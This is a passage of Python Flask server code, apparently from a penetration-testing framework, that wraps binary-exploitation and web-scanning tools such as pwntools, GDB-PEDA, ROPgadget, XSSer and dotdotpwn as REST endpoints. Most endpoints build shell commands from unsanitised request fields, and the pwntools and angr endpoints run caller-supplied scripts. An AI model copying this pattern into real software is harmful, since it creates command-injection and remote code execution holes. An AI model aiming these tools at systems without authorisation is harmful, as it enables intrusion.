        if commands:
            temp_script = "/tmp/r2_commands.txt"
            with open(temp_script, "w") as f:
                f.write(commands)
            command = f"r2 -i {temp_script} -q {binary}"
        else:
            command = f"r2 -q {binary}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔧 Starting Radare2 analysis: {binary}")
        result = execute_command(command)

        if commands and os.path.exists("/tmp/r2_commands.txt"):
            try:
                os.remove("/tmp/r2_commands.txt")
            except:
                pass

        logger.info(f"📊 Radare2 analysis completed for {binary}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in radare2 endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/binwalk", methods=["POST"])
def binwalk():
    """Execute Binwalk for firmware and file analysis with enhanced logging"""
    try:
        params = request.json
        file_path = params.get("file_path", "")
        extract = params.get("extract", False)
        additional_args = params.get("additional_args", "")

        if not file_path:
            logger.warning("🔧 Binwalk called without file_path parameter")
            return jsonify({
                "error": "File path parameter is required"
            }), 400

        command = f"binwalk"

        if extract:
            command += " -e"

        if additional_args:
            command += f" {additional_args}"

        command += f" {file_path}"

        logger.info(f"🔧 Starting Binwalk analysis: {file_path}")
        result = execute_command(command)
        logger.info(f"📊 Binwalk analysis completed for {file_path}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in binwalk endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/ropgadget", methods=["POST"])
def ropgadget():
    """Search for ROP gadgets in a binary using ROPgadget with enhanced logging"""
    try:
        params = request.json
        binary = params.get("binary", "")
        gadget_type = params.get("gadget_type", "")
        additional_args = params.get("additional_args", "")

        if not binary:
            logger.warning("🔧 ROPgadget called without binary parameter")
            return jsonify({
                "error": "Binary parameter is required"
            }), 400

        command = f"ROPgadget --binary {binary}"

        if gadget_type:
            command += f" --only '{gadget_type}'"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔧 Starting ROPgadget search: {binary}")
        result = execute_command(command)
        logger.info(f"📊 ROPgadget search completed for {binary}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in ropgadget endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/checksec", methods=["POST"])
def checksec():
    """Check security features of a binary with enhanced logging"""
    try:
        params = request.json
        binary = params.get("binary", "")

        if not binary:
            logger.warning("🔧 Checksec called without binary parameter")
            return jsonify({
                "error": "Binary parameter is required"
            }), 400

        command = f"checksec --file={binary}"

        logger.info(f"🔧 Starting Checksec analysis: {binary}")
        result = execute_command(command)
        logger.info(f"📊 Checksec analysis completed for {binary}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in checksec endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/xxd", methods=["POST"])
def xxd():
    """Create a hex dump of a file using xxd with enhanced logging"""
    try:
        params = request.json
        file_path = params.get("file_path", "")
        offset = params.get("offset", "0")
        length = params.get("length", "")
        additional_args = params.get("additional_args", "")

        if not file_path:
            logger.warning("🔧 XXD called without file_path parameter")
            return jsonify({
                "error": "File path parameter is required"
            }), 400

        command = f"xxd -s {offset}"

        if length:
            command += f" -l {length}"

        if additional_args:
            command += f" {additional_args}"

        command += f" {file_path}"

        logger.info(f"🔧 Starting XXD hex dump: {file_path}")
        result = execute_command(command)
        logger.info(f"📊 XXD hex dump completed for {file_path}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in xxd endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/strings", methods=["POST"])
def strings():
    """Extract strings from a binary file with enhanced logging"""
    try:
        params = request.json
        file_path = params.get("file_path", "")
        min_len = params.get("min_len", 4)
        additional_args = params.get("additional_args", "")

        if not file_path:
            logger.warning("🔧 Strings called without file_path parameter")
            return jsonify({
                "error": "File path parameter is required"
            }), 400

        command = f"strings -n {min_len}"

        if additional_args:
            command += f" {additional_args}"

        command += f" {file_path}"

        logger.info(f"🔧 Starting Strings extraction: {file_path}")
        result = execute_command(command)
        logger.info(f"📊 Strings extraction completed for {file_path}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in strings endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/objdump", methods=["POST"])
def objdump():
    """Analyze a binary using objdump with enhanced logging"""
    try:
        params = request.json
        binary = params.get("binary", "")
        disassemble = params.get("disassemble", True)
        additional_args = params.get("additional_args", "")

        if not binary:
            logger.warning("🔧 Objdump called without binary parameter")
            return jsonify({
                "error": "Binary parameter is required"
            }), 400

        command = f"objdump"

        if disassemble:
            command += " -d"
        else:
            command += " -x"

        if additional_args:
            command += f" {additional_args}"

        command += f" {binary}"

        logger.info(f"🔧 Starting Objdump analysis: {binary}")
        result = execute_command(command)
        logger.info(f"📊 Objdump analysis completed for {binary}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in objdump endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

# ============================================================================
# ENHANCED BINARY ANALYSIS AND EXPLOITATION FRAMEWORK (v6.0)
# ============================================================================

@app.route("/api/tools/ghidra", methods=["POST"])
def ghidra():
    """Execute Ghidra for advanced binary analysis and reverse engineering"""
    try:
        params = request.json
        binary = params.get("binary", "")
        project_name = params.get("project_name", "hexstrike_analysis")
        script_file = params.get("script_file", "")
        analysis_timeout = params.get("analysis_timeout", 300)
        output_format = params.get("output_format", "xml")
        additional_args = params.get("additional_args", "")

        if not binary:
            logger.warning("🔧 Ghidra called without binary parameter")
            return jsonify({"error": "Binary parameter is required"}), 400

        # Create Ghidra project directory
        project_dir = f"/tmp/ghidra_projects/{project_name}"
        os.makedirs(project_dir, exist_ok=True)

        # Base Ghidra command for headless analysis
        command = f"analyzeHeadless {project_dir} {project_name} -import {binary} -deleteProject"

        if script_file:
            command += f" -postScript {script_file}"

        if output_format == "xml":
            command += f" -postScript ExportXml.java {project_dir}/analysis.xml"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔧 Starting Ghidra analysis: {binary}")
        result = execute_command(command, timeout=analysis_timeout)
        logger.info(f"📊 Ghidra analysis completed for {binary}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in ghidra endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/pwntools", methods=["POST"])
def pwntools():
    """Execute Pwntools for exploit development and automation"""
    try:
        params = request.json
        script_content = params.get("script_content", "")
        target_binary = params.get("target_binary", "")
        target_host = params.get("target_host", "")
        target_port = params.get("target_port", 0)
        exploit_type = params.get("exploit_type", "local")  # local, remote, format_string, rop
        additional_args = params.get("additional_args", "")

        if not script_content and not target_binary:
            logger.warning("🔧 Pwntools called without script content or target binary")
            return jsonify({"error": "Script content or target binary is required"}), 400

        # Create temporary Python script
        script_file = "/tmp/pwntools_exploit.py"

        if script_content:
            # Use provided script content
            with open(script_file, "w") as f:
                f.write(script_content)
        else:
            # Generate basic exploit template
            template = f"""#!/usr/bin/env python3
from pwn import *

# Configuration
context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'info'

# Target configuration
binary = '{target_binary}' if '{target_binary}' else None
host = '{target_host}' if '{target_host}' else None
port = {target_port} if {target_port} else None

# Exploit logic
if binary:
    p = process(binary)
    log.info(f"Started local process: {{binary}}")
elif host and port:
    p = remote(host, port)
    log.info(f"Connected to {{host}}:{{port}}")
else:
    log.error("No target specified")
    exit(1)

# Basic interaction
p.interactive()
"""
            with open(script_file, "w") as f:
                f.write(template)

        command = f"python3 {script_file}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔧 Starting Pwntools exploit: {exploit_type}")
        result = execute_command(command)

        # Cleanup
        try:
            os.remove(script_file)
        except:
            pass

        logger.info(f"📊 Pwntools exploit completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in pwntools endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/one-gadget", methods=["POST"])
def one_gadget():
    """Execute one_gadget to find one-shot RCE gadgets in libc"""
    try:
        params = request.json
        libc_path = params.get("libc_path", "")
        level = params.get("level", 1)  # 0, 1, 2 for different constraint levels
        additional_args = params.get("additional_args", "")

        if not libc_path:
            logger.warning("🔧 one_gadget called without libc_path parameter")
            return jsonify({"error": "libc_path parameter is required"}), 400

        command = f"one_gadget {libc_path} --level {level}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔧 Starting one_gadget analysis: {libc_path}")
        result = execute_command(command)
        logger.info(f"📊 one_gadget analysis completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in one_gadget endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/libc-database", methods=["POST"])
def libc_database():
    """Execute libc-database for libc identification and offset lookup"""
    try:
        params = request.json
        action = params.get("action", "find")  # find, dump, download
        symbols = params.get("symbols", "")  # format: "symbol1:offset1 symbol2:offset2"
        libc_id = params.get("libc_id", "")
        additional_args = params.get("additional_args", "")

        if action == "find" and not symbols:
            logger.warning("🔧 libc-database find called without symbols")
            return jsonify({"error": "Symbols parameter is required for find action"}), 400

        if action in ["dump", "download"] and not libc_id:
            logger.warning("🔧 libc-database called without libc_id for dump/download")
            return jsonify({"error": "libc_id parameter is required for dump/download actions"}), 400

        # Navigate to libc-database directory (assuming it's installed)
        base_command = "cd /opt/libc-database 2>/dev/null || cd ~/libc-database 2>/dev/null || echo 'libc-database not found'"

        if action == "find":
            command = f"{base_command} && ./find {symbols}"
        elif action == "dump":
            command = f"{base_command} && ./dump {libc_id}"
        elif action == "download":
            command = f"{base_command} && ./download {libc_id}"
        else:
            return jsonify({"error": f"Invalid action: {action}"}), 400

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔧 Starting libc-database {action}: {symbols or libc_id}")
        result = execute_command(command)
        logger.info(f"📊 libc-database {action} completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in libc-database endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/gdb-peda", methods=["POST"])
def gdb_peda():
    """Execute GDB with PEDA for enhanced debugging and exploitation"""
    try:
        params = request.json
        binary = params.get("binary", "")
        commands = params.get("commands", "")
        attach_pid = params.get("attach_pid", 0)
        core_file = params.get("core_file", "")
        additional_args = params.get("additional_args", "")

        if not binary and not attach_pid and not core_file:
            logger.warning("🔧 GDB-PEDA called without binary, PID, or core file")
            return jsonify({"error": "Binary, PID, or core file parameter is required"}), 400

        # Base GDB command with PEDA
        command = "gdb -q"

        if binary:
            command += f" {binary}"

        if core_file:
            command += f" {core_file}"

        if attach_pid:
            command += f" -p {attach_pid}"

        # Create command script
        if commands:
            temp_script = "/tmp/gdb_peda_commands.txt"
            peda_commands = f"""
source ~/peda/peda.py
{commands}
quit
"""
            with open(temp_script, "w") as f:
                f.write(peda_commands)
            command += f" -x {temp_script}"
        else:
            # Default PEDA initialization
            command += " -ex 'source ~/peda/peda.py' -ex 'quit'"

        if additional_args:
            command += f" {additional_args}"

        target_info = binary or f'PID {attach_pid}' or core_file
        logger.info(f"🔧 Starting GDB-PEDA analysis: {target_info}")
        result = execute_command(command)

        # Cleanup
        if commands and os.path.exists("/tmp/gdb_peda_commands.txt"):
            try:
                os.remove("/tmp/gdb_peda_commands.txt")
            except:
                pass

        logger.info(f"📊 GDB-PEDA analysis completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in gdb-peda endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/angr", methods=["POST"])
def angr():
    """Execute angr for symbolic execution and binary analysis"""
    try:
        params = request.json
        binary = params.get("binary", "")
        script_content = params.get("script_content", "")
        find_address = params.get("find_address", "")
        avoid_addresses = params.get("avoid_addresses", "")
        analysis_type = params.get("analysis_type", "symbolic")  # symbolic, cfg, static
        additional_args = params.get("additional_args", "")

        if not binary:
            logger.warning("🔧 angr called without binary parameter")
            return jsonify({"error": "Binary parameter is required"}), 400

        # Create angr script
        script_file = "/tmp/angr_analysis.py"

        if script_content:
            with open(script_file, "w") as f:
                f.write(script_content)
        else:
            # Generate basic angr template
            template = f"""#!/usr/bin/env python3
import angr
import sys

# Load binary
project = angr.Project('{binary}', auto_load_libs=False)
print(f"Loaded binary: {binary}")
print(f"Architecture: {{project.arch}}")
print(f"Entry point: {{hex(project.entry)}}")

"""
            if analysis_type == "symbolic":
                template += f"""
# Symbolic execution
state = project.factory.entry_state()
simgr = project.factory.simulation_manager(state)

# Find and avoid addresses
find_addr = {find_address if find_address else 'None'}
avoid_addrs = {avoid_addresses.split(',') if avoid_addresses else '[]'}

if find_addr:
    simgr.explore(find=find_addr, avoid=avoid_addrs)
    if simgr.found:
        print("Found solution!")
        solution_state = simgr.found[0]
        print(f"Input: {{solution_state.posix.dumps(0)}}")
    else:
        print("No solution found")
else:
    print("No find address specified, running basic analysis")
"""
            elif analysis_type == "cfg":
                template += """
# Control Flow Graph analysis
cfg = project.analyses.CFGFast()
print(f"CFG nodes: {len(cfg.graph.nodes())}")
print(f"CFG edges: {len(cfg.graph.edges())}")

# Function analysis
for func_addr, func in cfg.functions.items():
    print(f"Function: {func.name} at {hex(func_addr)}")
"""

            with open(script_file, "w") as f:
                f.write(template)

        command = f"python3 {script_file}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔧 Starting angr analysis: {binary}")
        result = execute_command(command, timeout=600)  # Longer timeout for symbolic execution

        # Cleanup
        try:
            os.remove(script_file)
        except:
            pass

        logger.info(f"📊 angr analysis completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in angr endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/ropper", methods=["POST"])
def ropper():
    """Execute ropper for advanced ROP/JOP gadget searching"""
    try:
        params = request.json
        binary = params.get("binary", "")
        gadget_type = params.get("gadget_type", "rop")  # rop, jop, sys, all
        quality = params.get("quality", 1)  # 1-5, higher = better quality
        arch = params.get("arch", "")  # x86, x86_64, arm, etc.
        search_string = params.get("search_string", "")
        additional_args = params.get("additional_args", "")

        if not binary:
            logger.warning("🔧 ropper called without binary parameter")
            return jsonify({"error": "Binary parameter is required"}), 400

        command = f"ropper --file {binary}"

        if gadget_type == "rop":
            command += " --rop"
        elif gadget_type == "jop":
            command += " --jop"
        elif gadget_type == "sys":
            command += " --sys"
        elif gadget_type == "all":
            command += " --all"

        if quality > 1:
            command += f" --quality {quality}"

        if arch:
            command += f" --arch {arch}"

        if search_string:
            command += f" --search '{search_string}'"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔧 Starting ropper analysis: {binary}")
        result = execute_command(command)
        logger.info(f"📊 ropper analysis completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in ropper endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/pwninit", methods=["POST"])
def pwninit():
    """Execute pwninit for CTF binary exploitation setup"""
    try:
        params = request.json
        binary = params.get("binary", "")
        libc = params.get("libc", "")
        ld = params.get("ld", "")
        template_type = params.get("template_type", "python")  # python, c
        additional_args = params.get("additional_args", "")

        if not binary:
            logger.warning("🔧 pwninit called without binary parameter")
            return jsonify({"error": "Binary parameter is required"}), 400

        command = f"pwninit --bin {binary}"

        if libc:
            command += f" --libc {libc}"

        if ld:
            command += f" --ld {ld}"

        if template_type:
            command += f" --template {template_type}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔧 Starting pwninit setup: {binary}")
        result = execute_command(command)
        logger.info(f"📊 pwninit setup completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in pwninit endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

# ============================================================================
# ADDITIONAL WEB SECURITY TOOLS
# ============================================================================

@app.route("/api/tools/feroxbuster", methods=["POST"])
def feroxbuster():
    """Execute Feroxbuster for recursive content discovery with enhanced logging"""
    try:
        params = request.json
        url = params.get("url", "")
        wordlist = params.get("wordlist", "/usr/share/wordlists/dirb/common.txt")
        threads = params.get("threads", 10)
        additional_args = params.get("additional_args", "")

        if not url:
            logger.warning("🌐 Feroxbuster called without URL parameter")
            return jsonify({
                "error": "URL parameter is required"
            }), 400

        command = f"feroxbuster -u {url} -w {wordlist} -t {threads}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔍 Starting Feroxbuster scan: {url}")
        result = execute_command(command)
        logger.info(f"📊 Feroxbuster scan completed for {url}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in feroxbuster endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/dotdotpwn", methods=["POST"])
def dotdotpwn():
    """Execute DotDotPwn for directory traversal testing with enhanced logging"""
    try:
        params = request.json
        target = params.get("target", "")
        module = params.get("module", "http")
        additional_args = params.get("additional_args", "")

        if not target:
            logger.warning("🎯 DotDotPwn called without target parameter")
            return jsonify({
                "error": "Target parameter is required"
            }), 400

        command = f"dotdotpwn -m {module} -h {target}"

        if additional_args:
            command += f" {additional_args}"

        command += " -b"

        logger.info(f"🔍 Starting DotDotPwn scan: {target}")
        result = execute_command(command)
        logger.info(f"📊 DotDotPwn scan completed for {target}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in dotdotpwn endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/xsser", methods=["POST"])
def xsser():
    """Execute XSSer for XSS vulnerability testing with enhanced logging"""
    try:
        params = request.json
        url = params.get("url", "")
        params_str = params.get("params", "")
        additional_args = params.get("additional_args", "")

        if not url:
            logger.warning("🌐 XSSer called without URL parameter")
            return jsonify({
                "error": "URL parameter is required"
            }), 400

        command = f"xsser --url '{url}'"

        if params_str:
            command += f" --param='{params_str}'"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔍 Starting XSSer scan: {url}")
        result = execute_command(command)
        logger.info(f"📊 XSSer scan completed for {url}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in xsser endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/wfuzz", methods=["POST"])
def wfuzz():
    """Execute Wfuzz for web application fuzzing with enhanced logging"""
    try:
        params = request.json
        url = params.get("url", "")
        wordlist = params.get("wordlist", "/usr/share/wordlists/dirb/common.txt")
        additional_args = params.get("additional_args", "")

        if not url:
            logger.warning("🌐 Wfuzz called without URL parameter")
            return jsonify({
                "error": "URL parameter is required"
            }), 400

        command = f"wfuzz -w {wordlist} '{url}'"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔍 Starting Wfuzz scan: {url}")
        result = execute_command(command)
        logger.info(f"📊 Wfuzz scan completed for {url}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in wfuzz endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

# ============================================================================
# ENHANCED WEB APPLICATION SECURITY TOOLS (v6.0)
# ============================================================================

@app.route("/api/tools/dirsearch", methods=["POST"])
def dirsearch():
    """Execute Dirsearch for advanced directory and file discovery with enhanced logging"""
    try:
        params = request.json
        url = params.get("url", "")
        extensions = params.get("extensions", "php,html,js,txt,xml,json")
        wordlist = params.get("wordlist", "/usr/share/wordlists/dirsearch/common.txt")
        threads = params.get("threads", 30)
        recursive = params.get("recursive", False)
        additional_args = params.get("additional_args", "")

        if not url:
            logger.warning("🌐 Dirsearch called without URL parameter")
            return jsonify({"error": "URL parameter is required"}), 400

        command = f"dirsearch -u {url} -e {extensions} -w {wordlist} -t {threads}"

        if recursive:
            command += " -r"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"📁 Starting Dirsearch scan: {url}")
        result = execute_command(command)
        logger.info(f"📊 Dirsearch scan completed for {url}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in dirsearch endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/katana", methods=["POST"])
@require_api_key
def katana():
    """Execute Katana for next-generation crawling and spidering with enhanced logging"""
    try:
        params = request.json or {}
        url = sanitize_input(params.get("url", ""))
        depth = int(params.get("depth", 3))
        js_crawl = params.get("js_crawl", True)
        form_extraction = params.get("form_extraction", True)
        headless = params.get("headless", False)
        output_format = sanitize_input(params.get("output_format", "json"))
        timeout = int(params.get("timeout", 0))
        concurrency = int(params.get("concurrency", 10))
        additional_args = sanitize_input(params.get("additional_args", ""))

        if not url:
            logger.warning("🌐 Katana called without URL parameter")
            return jsonify({"error": "URL parameter is required"}), 400

        scope_manager.validate_or_raise(url)

        command = f"katana -u '{url}' -d {depth} -c {concurrency}"

        if js_crawl:
            command += " -jc"
        if form_extraction:
            command += " -fx"
        if headless:
            command += " -headless"
        if output_format == "json":
            command += " -jsonl"
        if timeout > 0:
            command += f" -timeout {timeout}"
        if additional_args:
            command += f" {additional_args}"

        logger.info(f"⚔️  Starting Katana crawl: {url} (depth={depth}, js={js_crawl}, headless={headless})")
        result = execute_command_with_recovery("katana", command, params)
        logger.info(f"📊 Katana crawl completed for {url}")
        return jsonify(result)
    except ScopeViolationError as e:
        return jsonify({"error": str(e), "success": False, "scope_violation": True}), 403
    except Exception as e:
        logger.error(f"💥 Error in katana endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/waybackurls", methods=["POST"])
def waybackurls():
    """Execute Waybackurls for historical URL discovery with enhanced logging"""
    try:
        params = request.json
        domain = params.get("domain", "")
        get_versions = params.get("get_versions", False)
        no_subs = params.get("no_subs", False)
        additional_args = params.get("additional_args", "")

        if not domain:
            logger.warning("🌐 Waybackurls called without domain parameter")
            return jsonify({"error": "Domain parameter is required"}), 400

        command = f"waybackurls {domain}"

        if get_versions:
            command += " --get-versions"

        if no_subs:
            command += " --no-subs"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🕰️  Starting Waybackurls discovery: {domain}")
        result = execute_command(command)
        logger.info(f"📊 Waybackurls discovery completed for {domain}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in waybackurls endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/arjun", methods=["POST"])
def arjun():
    """Execute Arjun for HTTP parameter discovery with enhanced logging"""
    try:
        params = request.json
        url = params.get("url", "")
        method = params.get("method", "GET")
        wordlist = params.get("wordlist", "")
        delay = params.get("delay", 0)
        threads = params.get("threads", 25)
        stable = params.get("stable", False)
        additional_args = params.get("additional_args", "")

        if not url:
            logger.warning("🌐 Arjun called without URL parameter")
            return jsonify({"error": "URL parameter is required"}), 400

        command = f"arjun -u {url} -m {method} -t {threads}"

        if wordlist:
            command += f" -w {wordlist}"

        if delay > 0:
            command += f" -d {delay}"

        if stable:
            command += " --stable"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🎯 Starting Arjun parameter discovery: {url}")
        result = execute_command(command)
        logger.info(f"📊 Arjun parameter discovery completed for {url}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in arjun endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/paramspider", methods=["POST"])
def paramspider():
    """Execute ParamSpider for parameter mining from web archives with enhanced logging"""
    try:
        params = request.json
        domain = params.get("domain", "")
        level = params.get("level", 2)
        exclude = params.get("exclude", "png,jpg,gif,jpeg,swf,woff,svg,pdf,css,ico")
        output = params.get("output", "")
        additional_args = params.get("additional_args", "")

        if not domain:
            logger.warning("🌐 ParamSpider called without domain parameter")
            return jsonify({"error": "Domain parameter is required"}), 400

        command = f"paramspider -d {domain} -l {level}"

        if exclude:
            command += f" --exclude {exclude}"

        if output:
            command += f" -o {output}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🕷️  Starting ParamSpider mining: {domain}")
        result = execute_command(command)
        logger.info(f"📊 ParamSpider mining completed for {domain}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in paramspider endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/x8", methods=["POST"])
def x8():
    """Execute x8 for hidden parameter discovery with enhanced logging"""
    try:
        params = request.json
        url = params.get("url", "")
        wordlist = params.get("wordlist", "/usr/share/wordlists/x8/params.txt")
        method = params.get("method", "GET")
        body = params.get("body", "")
        headers = params.get("headers", "")
        additional_args = params.get("additional_args", "")

        if not url:
            logger.warning("🌐 x8 called without URL parameter")
            return jsonify({"error": "URL parameter is required"}), 400

        command = f"x8 -u {url} -w {wordlist} -X {method}"

        if body:
            command += f" -b '{body}'"

        if headers:
            command += f" -H '{headers}'"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔍 Starting x8 parameter discovery: {url}")
        result = execute_command(command)
        logger.info(f"📊 x8 parameter discovery completed for {url}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in x8 endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/jaeles", methods=["POST"])
def jaeles():
    """Execute Jaeles for advanced vulnerability scanning with custom signatures"""
    try:
        params = request.json
        url = params.get("url", "")
        signatures = params.get("signatures", "")
        config = params.get("config", "")
        threads = params.get("threads", 20)
        timeout = params.get("timeout", 20)
        additional_args = params.get("additional_args", "")

        if not url:
            logger.warning("🌐 Jaeles called without URL parameter")
            return jsonify({"error": "URL parameter is required"}), 400

        command = f"jaeles scan -u {url} -c {threads} --timeout {timeout}"

        if signatures:
            command += f" -s {signatures}"

        if config:
            command += f" --config {config}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔬 Starting Jaeles vulnerability scan: {url}")
        result = execute_command(command)
        logger.info(f"📊 Jaeles vulnerability scan completed for {url}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in jaeles endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/httpx", methods=["POST"])
def httpx():
    """Execute httpx for fast HTTP probing and technology detection"""
    try:
        params = request.json
        target = params.get("target", "")
        probe = params.get("probe", True)
        tech_detect = params.get("tech_detect", False)
        status_code = params.get("status_code", False)
        content_length = params.get("content_length", False)
        title = params.get("title", False)
        web_server = params.get("web_server", False)
        threads = params.get("threads", 50)
        additional_args = params.get("additional_args", "")

        if not target:
            logger.warning("🌐 httpx called without target parameter")
            return jsonify({"error": "Target parameter is required"}), 400

        command = f"httpx -l {target} -t {threads}"

        if probe:
            command += " -probe"

        if tech_detect:
            command += " -tech-detect"

        if status_code:
            command += " -sc"

        if content_length:
            command += " -cl"

        if title:
            command += " -title"

        if web_server:
            command += " -server"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🌍 Starting httpx probe: {target}")
        result = execute_command(command)
        logger.info(f"📊 httpx probe completed for {target}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in httpx endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/anew", methods=["POST"])
def anew():
    """Execute anew for appending new lines to files (useful for data processing)"""
    try:
        params = request.json
        input_data = params.get("input_data", "")
        output_file = params.get("output_file", "")
        additional_args = params.get("additional_args", "")

        if not input_data:
            logger.warning("📝 Anew called without input data")
            return jsonify({"error": "Input data is required"}), 400

        if output_file:
            command = f"echo '{input_data}' | anew {output_file}"
        else:
            command = f"echo '{input_data}' | anew"

        if additional_args:
            command += f" {additional_args}"

        logger.info("📝 Starting anew data processing")
        result = execute_command(command)
        logger.info("📊 anew data processing completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in anew endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/qsreplace", methods=["POST"])
def qsreplace():
    """Execute qsreplace for query string parameter replacement"""
    try:
        params = request.json
        urls = params.get("urls", "")
        replacement = params.get("replacement", "FUZZ")
        additional_args = params.get("additional_args", "")

        if not urls:
            logger.warning("🌐 qsreplace called without URLs")
            return jsonify({"error": "URLs parameter is required"}), 400

        command = f"echo '{urls}' | qsreplace '{replacement}'"

        if additional_args:
            command += f" {additional_args}"

        logger.info("🔄 Starting qsreplace parameter replacement")
        result = execute_command(command)
        logger.info("📊 qsreplace parameter replacement completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in qsreplace endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/tools/uro", methods=["POST"])
def uro():
    """Execute uro for filtering out similar URLs"""
    try:
        params = request.json
        urls = params.get("urls", "")
        whitelist = params.get("whitelist", "")
        blacklist = params.get("blacklist", "")
        additional_args = params.get("additional_args", "")

        if not urls:
            logger.warning("🌐 uro called without URLs")
            return jsonify({"error": "URLs parameter is required"}), 400

        command = f"echo '{urls}' | uro"

        if whitelist:
            command += f" --whitelist {whitelist}"

        if blacklist:
            command += f" --blacklist {blacklist}"

        if additional_args:
            command += f" {additional_args}"

        logger.info("🔍 Starting uro URL filtering")
        result = execute_command(command)
        logger.info("📊 uro URL filtering completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in uro endpoint: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

# ============================================================================
# ADVANCED WEB SECURITY TOOLS CONTINUED
# ============================================================================

# ============================================================================
# ENHANCED HTTP TESTING FRAMEWORK (BURP SUITE ALTERNATIVE)
# ============================================================================

